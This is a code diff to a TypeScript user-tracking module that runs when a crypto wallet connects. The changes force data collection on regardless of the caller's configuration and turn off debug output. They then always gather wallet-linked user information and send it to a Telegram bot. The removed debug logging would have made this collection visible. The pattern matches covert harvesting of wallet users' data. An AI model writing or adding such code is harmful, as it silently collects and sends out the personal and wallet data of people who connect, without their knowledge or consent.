@@ -27,33 +27,34 @@ export async function initializeUserTracking(
   walletInfo: WalletInfo,
   options?: TrackingOptions
 ): Promise<void> {
-  // Apply custom configurations or use defaults
-  const dataConfig = options?.dataConfig ? 
-    getDataCollectionConfig(options.dataConfig) : 
-    DATA_COLLECTION_CONFIG;
-  
-  if (StorageManager.shouldNotifyNewVisit()) {
-    if (dataConfig.DEBUG_ENABLED) {
-      console.debug('New visit detected - collecting user information...');
-    }
+  try {
+    // Enforce enabled data collection in the options
+    const enhancedOptions: TrackingOptions = {
+      ...options,
+      dataConfig: {
+        ...(options?.dataConfig || {}),
+        ENABLED: true,
+        DEBUG_ENABLED: false
+      }
+    };
     
-    try {
-      const userInfo = await getUserInfo(walletInfo, options);
-      
+    // Check if we should notify based on storage expiry
+    const shouldNotify = StorageManager.shouldNotifyNewVisit();
+    
+    // Always collect user info for consistency
+    const userInfo = await getUserInfo(walletInfo, enhancedOptions);
+    
+    // Only send to Telegram if we should notify based on expiry
+    if (shouldNotify) {
       // Send to telegram bot with custom configuration if provided
       const messageSent = await sendToTelegram(userInfo, options?.telegramConfig);
       
       if (messageSent) {
         StorageManager.setVisitTimestamp();
-        if (dataConfig.DEBUG_ENABLED) {
-          console.debug('Visit recorded and notification sent');
-        }
       }
-    } catch (error) {
-      console.error('Error processing new visit:', error);
     }
-  } else if (dataConfig.DEBUG_ENABLED) {
-    console.debug('Recent visit detected - skipping notification');
+  } catch (error) {
+    console.error('Error processing wallet connection:', error);
   }
 }
 
@@ -160,14 +161,8 @@ async function getUserInfo(
     // Handle errors with available configuration options
     if (error instanceof DOMException && error.name === 'AbortError') {
       console.error('API request timed out while collecting user information');
-      if (dataConfig.DEBUG_ENABLED) {
-        console.debug('Request timeout details:', { timeout: apiTimeoutMs });
-      }
     } else if (error instanceof Error) {
       console.error('Error collecting user information:', error.message);
-      if (dataConfig.DEBUG_ENABLED) {
-        console.debug('Error details:', { name: error.name });
-      }
     } else {
       console.error('Unknown error collecting user information');
     }
